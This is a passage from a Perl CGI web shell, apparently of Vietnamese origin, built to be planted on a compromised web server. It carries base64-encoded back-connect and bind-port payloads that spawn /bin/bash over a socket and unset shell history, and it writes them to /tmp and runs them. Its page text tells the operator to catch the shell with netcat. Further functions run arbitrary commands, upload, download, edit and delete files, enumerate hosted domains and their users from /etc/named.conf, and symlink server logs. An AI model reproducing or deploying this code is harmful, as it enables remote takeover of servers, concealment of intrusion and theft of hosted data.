	<td colspan=3><font color=#FFFFFF>[+] Client listen before connect back!
	<br>[+] Try check your Port with <a target="_blank" href="http://www.canyouseeme.org/">http://www.canyouseeme.org/</a>
	<br>[+] Client listen with command: <run>nc -vv -l -p <span id="ba">80</span></run></font></td>

	</tr>
	</table>

	<br><br>
	<table>
	<tr>
	<form method="POST" action="$ScriptLocation">
	<td>Bind Port: <input type="hidden" name="a" value="backbind"></td>

	<td> Port: <input type="text" size="15" name="clientport" value="1412" onkeyup="document.getElementById('bi').innerHTML=this.value;">

	 Password: <input type="text" size="15" name="bindpass" value="THIEUGIABUON"></td>
	<td><input name="s" class="submit" type="submit" name="submit" value="Bind"></td>
	</form>
	</tr>
	<tr>
	<td colspan=3><font color=#FFFFFF>[+] Chuc nang chua dc test!
	<br>[+] Try command: <run>nc $ENV{'SERVER_ADDR'} <span id="bi">1412</span></run></font></td>

	</tr>
	</table><br>
END
}
#------------------------------------------------------------------------------
# Backconnect use perl
#------------------------------------------------------------------------------
sub BackBind
{
	use MIME::Base64;
	use Socket;	
	$backperl="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgSU86OlNvY2tldDsNCiRTaGVsbAk9ICIvYmluL2Jhc2giOw0KJEFSR0M9QEFSR1Y7DQp1c2UgU29ja2V0Ow0KdXNlIEZpbGVIYW5kbGU7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgZ2V0cHJvdG9ieW5hbWUoInRjcCIpKSBvciBkaWUgcHJpbnQgIlstXSBVbmFibGUgdG8gUmVzb2x2ZSBIb3N0XG4iOw0KY29ubmVjdChTT0NLRVQsIHNvY2thZGRyX2luKCRBUkdWWzFdLCBpbmV0X2F0b24oJEFSR1ZbMF0pKSkgb3IgZGllIHByaW50ICJbLV0gVW5hYmxlIHRvIENvbm5lY3QgSG9zdFxuIjsNCnByaW50ICJDb25uZWN0ZWQhIjsNClNPQ0tFVC0+YXV0b2ZsdXNoKCk7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCI+JlNPQ0tFVCIpOw0Kb3BlbihTVERFUlIsIj4mU09DS0VUIik7DQpwcmludCAiLS09PSBDb25uZWN0ZWQgQmFja2Rvb3IgPT0tLSAgXG5cbiI7DQpzeXN0ZW0oInVuc2V0IEhJU1RGSUxFOyB1bnNldCBTQVZFSElTVCA7ZWNobyAnWytdIFN5c3RlbWluZm86ICc7IHVuYW1lIC1hO2VjaG87ZWNobyAnWytdIFVzZXJpbmZvOiAnOyBpZDtlY2hvO2VjaG8gJ1srXSBEaXJlY3Rvcnk6ICc7IHB3ZDtlY2hvOyBlY2hvICdbK10gU2hlbGw6ICc7JFNoZWxsIik7DQpjbG9zZSBTT0NLRVQ7";
	$bindperl="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJEFSR0M9QEFSR1Y7DQokcG9ydAk9ICRBUkdWWzBdOw0KJHByb3RvCT0gZ2V0cHJvdG9ieW5hbWUoJ3RjcCcpOw0KJFNoZWxsCT0gIi9iaW4vYmFzaCI7DQpzb2NrZXQoU0VSVkVSLCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKW9yIGRpZSAic29ja2V0OiQhIjsNCnNldHNvY2tvcHQoU0VSVkVSLCBTT0xfU09DS0VULCBTT19SRVVTRUFERFIsIHBhY2soImwiLCAxKSlvciBkaWUgInNldHNvY2tvcHQ6ICQhIjsNCmJpbmQoU0VSVkVSLCBzb2NrYWRkcl9pbigkcG9ydCwgSU5BRERSX0FOWSkpb3IgZGllICJiaW5kOiAkISI7DQpsaXN0ZW4oU0VSVkVSLCBTT01BWENPTk4pCQlvciBkaWUgImxpc3RlbjogJCEiOw0KZm9yKDsgJHBhZGRyID0gYWNjZXB0KENMSUVOVCwgU0VSVkVSKTsgY2xvc2UgQ0xJRU5UKQ0Kew0KCW9wZW4oU1RESU4sICI+JkNMSUVOVCIpOw0KCW9wZW4oU1RET1VULCAiPiZDTElFTlQiKTsNCglvcGVuKFNUREVSUiwgIj4mQ0xJRU5UIik7DQoJc3lzdGVtKCJ1bnNldCBISVNURklMRTsgdW5zZXQgU0FWRUhJU1QgO2VjaG8gJ1srXSBTeXN0ZW1pbmZvOiAnOyB1bmFtZSAtYTtlY2hvO2VjaG8gJ1srXSBVc2VyaW5mbzogJzsgaWQ7ZWNobztlY2hvICdbK10gRGlyZWN0b3J5OiAnOyBwd2Q7ZWNobzsgZWNobyAnWytdIFNoZWxsOiAnOyRTaGVsbCIpOw0KCWNsb3NlKFNURElOKTsNCgljbG9zZShTVERPVVQpOw0KCWNsb3NlKFNUREVSUik7DQp9DQo=";

	$ClientAddr = $in{'clientaddr'};
	$ClientPort = int($in{'clientport'});
	if($ClientPort eq 0)
	{
		return &BackBindForm;
	}elsif(!$ClientAddr eq "")
	{
		$Data=decode_base64($backperl);
		if(-w "/tmp/")
		{
			$File="/tmp/backconnect.pl";	
		}else
		{
			$File=$CurrentDir.$PathSep."backconnect.pl";
		}
		open(FILE, ">$File");
		print FILE $Data;
		close FILE;
		system("perl backconnect.pl $ClientAddr $ClientPort");
		unlink($File);
		exit 0;
	}else
	{
		$Data=decode_base64($bindperl);
		if(-w "/tmp")
		{
			$File="/tmp/bindport.pl";	
		}else
		{
			$File=$CurrentDir.$PathSep."bindport.pl";
		}
		open(FILE, ">$File");
		print FILE $Data;
		close FILE;
		system("perl bindport.pl $ClientPort");
		unlink($File);
		exit 0;
	}
}
#------------------------------------------------------------------------------
#  Array List Directory
#------------------------------------------------------------------------------
sub RmDir($) 
{
	my $dir = shift;
    if(opendir(DIR,$dir))
	{
		while($file = readdir(DIR))
		{
			if(($file ne ".") && ($file ne ".."))
			{
				$file= $dir.$PathSep.$file;
				if(-d $file)
				{
					&RmDir($file);
				}
				else
				{
					unlink($file);
				}
			}
		}
		closedir(DIR);
	}
	if(!rmdir($dir))
	{
		
	}
}
sub FileOwner($)
{
	my $file = shift;
	if(-e $file)
	{
		($uid,$gid) = (stat($file))[4,5];
		if($WinNT)
		{
			return "???";
		}
		else
		{
			$name=getpwuid($uid);
			$group=getgrgid($gid);
			return $name."/".$group;
		}
	}
	return "???";
}
sub ParentFolder($)
{
	my $path = shift;
	my $Comm = "cd \"$CurrentDir\"".$CmdSep."cd ..".$CmdSep.$CmdPwd;
	chop($path = `$Comm`);
	return $path;
}
sub FilePerms($)
{
	my $file = shift;
	my $ur = "-";
	my $uw = "-";
	if(-e $file)
	{
		if($WinNT)
		{
			if(-r $file){ $ur = "r"; }
			if(-w $file){ $uw = "w"; }
			return $ur . " / " . $uw;
		}else
		{
			$mode=(stat($file))[2];
			$result = sprintf("%04o", $mode & 07777);
			return $result;
		}
	}
	return "0000";
}
sub FileLastModified($)
{
	my $file = shift;
	if(-e $file)
	{
		($la) = (stat($file))[9];
		($d,$m,$y,$h,$i) = (localtime($la))[3,4,5,2,1];
		$y = $y + 1900;
		@month = qw/1 2 3 4 5 6 7 8 9 10 11 12/;
		$lmtime = sprintf("%02d/%s/%4d %02d:%02d",$d,$month[$m],$y,$h,$i);
		return $lmtime;
	}
	return "???";
}
sub FileSize($)
{
	my $file = shift;
	if(-f $file)
	{
		return -s $file;
	}
	return "0";

}
sub ParseFileSize($)
{
	my $size = shift;
	if($size <= 1024)
	{
		return $size. " B";
	}
	else
	{
		if($size <= 1024*1024) 
		{
			$size = sprintf("%.02f",$size / 1024);
			return $size." KB";
		}
		else 
		{
			$size = sprintf("%.2f",$size / 1024 / 1024);
			return $size." MB";
		}
	}
}
sub trim($)
{
	my $string = shift;
	$string =~ s/^\s+//;
	$string =~ s/\s+$//;
	return $string;
}
sub AddSlashes($)
{
	my $string = shift;
	$string=~ s/\\/\\\\/g;
	return $string;
}
sub ListDir
{
	my $path = $CurrentDir.$PathSep;
	$path=~ s/\\\\/\\/g;
	my $result = "<form name='f' action='$ScriptLocation'><span style='font: 11pt Verdana; font-weight: bold;'>Path: [ ".&AddLinkDir("gui")." ] </span><input type='text' name='d' size='40' value='$CurrentDir' /><input type='hidden' name='a' value='gui'><input class='submit' type='submit' value='Change'></form>";
	if(-d $path)
	{
		my @fname = ();
		my @dname = ();
		if(opendir(DIR,$path))
		{
			while($file = readdir(DIR))
			{
				$f=$path.$file;
				if(-d $f)
				{
					push(@dname,$file);
				}
				else
				{
					push(@fname,$file);
				}
			}
			closedir(DIR);
		}
		@fname = sort { lc($a) cmp lc($b) } @fname;
		@dname = sort { lc($a) cmp lc($b) } @dname;
		$result .= "<div><table width='90%' class='listdir'>

		<tr style='background-color: #3e3e3e'><th>File Name</th>
		<th style='width:100px;'>File Size</th>
		<th style='width:150px;'>Owner</th>
		<th style='width:100px;'>Permission</th>
		<th style='width:150px;'>Last Modified</th>
		<th style='width:260px;'>Action</th></tr>";
		my $style="line";
		my $i=0;
		foreach my $d (@dname)
		{
			$style= ($style eq "line") ? "notline": "line";
			$d = &trim($d);
			$dirname=$d;
			if($d eq "..") 
			{
				$d = &ParentFolder($path);
			}
			elsif($d eq ".") 
			{
				$d = $path;
			}
			else 
			{
				$d = $path.$d;
			}
			$result .= "<tr class='$style'>

			<td id='File_$i' style='font: 11pt Verdana; font-weight: bold;'><a  href='?a=gui&d=".$d."'>[ ".$dirname." ]</a></td>";
			$result .= "<td>DIR</td>";
			$result .= "<td style='text-align:center;'>".&FileOwner($d)."</td>";
			$result .= "<td id='FilePerms_$i' style='text-align:center;' ondblclick=\"rm_chmod_form(this,".$i.",'".&FilePerms($d)."','".$dirname."')\" ><span onclick=\"chmod_form(".$i.",'".$dirname."')\" >".&FilePerms($d)."</span></td>";
			$result .= "<td style='text-align:center;'>".&FileLastModified($d)."</td>";
			$result .= "<td style='text-align:center;'><a href='javascript:return false;' onclick=\"rename_form($i,'$dirname','".&AddSlashes(&AddSlashes($d))."')\">Rename</a>  | <a onclick=\"if(!confirm('Remove dir: $dirname ?')) { return false;}\" href='?a=gui&d=$path&remove=$dirname'>Remove</a></td>";
			$result .= "</tr>";
			$i++;
		}
		foreach my $f (@fname)
		{
			$style= ($style eq "line") ? "notline": "line";
			$file=$f;
			$f = $path.$f;
			$view = "?dir=".$path."&view=".$f;
			$result .= "<tr class='$style'><td id='File_$i' style='font: 11pt Verdana;'><a href='?a=command&d=".$path."&c=edit%20".$file."'>".$file."</a></td>";
			$result .= "<td>".&ParseFileSize(&FileSize($f))."</td>";
			$result .= "<td style='text-align:center;'>".&FileOwner($f)."</td>";
			$result .= "<td id='FilePerms_$i' style='text-align:center;' ondblclick=\"rm_chmod_form(this,".$i.",'".&FilePerms($f)."','".$file."')\" ><span onclick=\"chmod_form($i,'$file')\" >".&FilePerms($f)."</span></td>";
			$result .= "<td style='text-align:center;'>".&FileLastModified($f)."</td>";
			$result .= "<td style='text-align:center;'><a href='?a=command&d=".$path."&c=edit%20".$file."'>Edit</a> | <a href='javascript:return false;' onclick=\"rename_form($i,'$file','f')\">Rename</a> | <a href='?a=download&o=go&f=".$f."'>Download</a> | <a onclick=\"if(!confirm('Remove file: $file ?')) { return false;}\" href='?a=gui&d=$path&remove=$file'>Remove</a></td>";
			$result .= "</tr>";
			$i++;
		}
		$result .= "</table></div>";
	}
	return $result;
}
#------------------------------------------------------------------------------
# Try to View List User
#------------------------------------------------------------------------------
sub ViewDomainUser
{
	open (domains, '/etc/named.conf') or $err=1;
	my @cnzs = <domains>;
	close d0mains;
	my $style="line";
	my $result="<h5><font style='font: 15pt Verdana;color: #ff9900;'>Hoang Sa - Truong Sa</font></h5>";
	if ($err)
	{
		$result .=  ('<p>C0uldn\'t Bypass it , Sorry</p>');
		return $result;
	}else
	{
		$result .= '<table><tr><th>Domains</th> <th>User</th></tr>';
	}
	foreach my $one (@cnzs)
	{
		if($one =~ m/.*?zone "(.*?)" {/)
		{	
			$style= ($style eq "line") ? "notline": "line";
			$filename= "/etc/valiases/".$one;
			$owner = getpwuid((stat($filename))[4]);
			$result .= '<tr class="$style" width=50%><td>'.$one.' </td><td> '.$owner.'</td></tr>';
		}
	}
	$result .= '</table>';
	return $result;
}
#------------------------------------------------------------------------------
# View Log
#------------------------------------------------------------------------------
sub ViewLog
{
	if($WinNT)
	{
		return "<h2><font style='font: 20pt Verdana;color: #ff9900;'>Don't run on Windows</font></h2>";
	}
	my $result="<table><tr><th>Path Log</th><th>Submit</th></tr>";
	my @pathlog=(
				'/usr/local/apache/logs/error_log',
				'/var/log/httpd/error_log',
				'/usr/local/apache/logs/access_log'
				);
	my $i=0;
	my $perms;
	my $sl;
	foreach my $log (@pathlog)
	{
		if(-w $log)
		{
			$perms="OK";
		}else
		{
			chop($sl = `ln -s $log error_log_$i`);
			if(&trim($ls) eq "")
			{
				if(-r $ls)
				{
					$perms="OK";
					$log="error_log_".$i;
				}
			}else
			{
				$perms="<font style='color: red;'>Cancel<font>";
			}
		}
		$result .=<<END;
		<tr>

			<form action="" method="post">
			<td><input type="text" onkeyup="document.getElementById('log_$i').value='less ' + this.value;" value="$log" size='50'/></td>
			<td><input class="submit" type="submit" value="Try" /></td>
			<input type="hidden" id="log_$i" name="c" value="less $log"/>
			<input type="hidden" name="a" value="command" />
			<input type="hidden" name="d" value="$CurrentDir" />
			</form>
			<td>$perms</td>

		</tr>
END
		$i++;
	}
	$result .="</table>";
	return $result;
}
#------------------------------------------------------------------------------
# Main Program - Execution Starts Here
#------------------------------------------------------------------------------
&ReadParse;
&GetCookies;

$ScriptLocation = $ENV{'SCRIPT_NAME'};
$ServerName = $ENV{'SERVER_NAME'};
$LoginPassword = $in{'p'};
$RunCommand = $in{'c'};
$TransferFile = $in{'f'};
$Options = $in{'o'};
$Action = $in{'a'};

$Action = "command" if($Action eq ""); # no action specified, use default

# get the directory in which the commands will be executed
$CurrentDir = &trim($in{'d'});
# mac dinh xuat thong tin neu ko co lenh nao!
$RunCommand= $WinNT?"dir":"dir -lia" if($RunCommand eq "");
chop($CurrentDir = `$CmdPwd`) if($CurrentDir eq "");

$LoggedIn = $Cookies{'SAVEDPWD'} eq $Password;

if($Action eq "login" || !$LoggedIn) 		# user needs/has to login
{
	&PerformLogin;
}elsif($Action eq "gui") # GUI directory
{
	&PrintPageHeader;
	if(!$WinNT)
	{
		$chmod=int($in{'chmod'});
		if(!($chmod eq 0))
		{
			$chmod=int($in{'chmod'});
			$file=$CurrentDir.$PathSep.$TransferFile;
			chop($result= `chmod $chmod "$file"`);
			if(&trim($result) eq "")
			{
				print "<run> Done! </run><br>";
			}else
			{
				print "<run> Sorry! You dont have permissions! </run><br>";
			}
		}
	}
	$rename=$in{'rename'};
	if(!$rename eq "")
	{
		if(rename($TransferFile,$rename))
		{
			print "<run> Done! </run><br>";
		}else
		{
			print "<run> Sorry! You dont have permissions! </run><br>";
		}
	}
	$remove=$in{'remove'};
	if($remove ne "")
	{
		$rm = $CurrentDir.$PathSep.$remove;
		if(-d $rm)
		{
			&RmDir($rm);
		}else
		{
			if(unlink($rm))
			{
				print "<run> Done! </run><br>";
			}else
			{
				print "<run> Sorry! You dont have permissions! </run><br>";
			}			
		}
	}
	print &ListDir;

}
elsif($Action eq "command")				 	# user wants to run a command
{
	&PrintPageHeader("c");
	print &ExecuteCommand;
}
elsif($Action eq "save")				 	# user wants to save a file
{
	&PrintPageHeader;
	if(&SaveFile($in{'data'},$in{'file'}))
	{
		print "<run> Done! </run><br>";
	}else
	{
		print "<run> Sorry! You dont have permissions! </run><br>";
	}
	print &ListDir;
}
elsif($Action eq "upload") 					# user wants to upload a file
{
	&PrintPageHeader;

	print &UploadFile;
}
elsif($Action eq "backbind") 				# user wants to back connect or bind port
{
	&PrintPageHeader("clientport");
	print &BackBind;
}
elsif($Action eq "bruteforcer") 			# user wants to brute force
{
	&PrintPageHeader;
	print &BruteForcer;
}elsif($Action eq "download") 				# user wants to download a file
{
	print &DownloadFile;
}elsif($Action eq "checklog") 				# user wants to view log file
{
	&PrintPageHeader;
	print &ViewLog;

}elsif($Action eq "domainsuser") 			# user wants to view list user/domain
{
	&PrintPageHeader;
	print &ViewDomainUser;
}elsif($Action eq "logout") 				# user wants to logout
{
	&PerformLogout;
}
&PrintPageFooter;
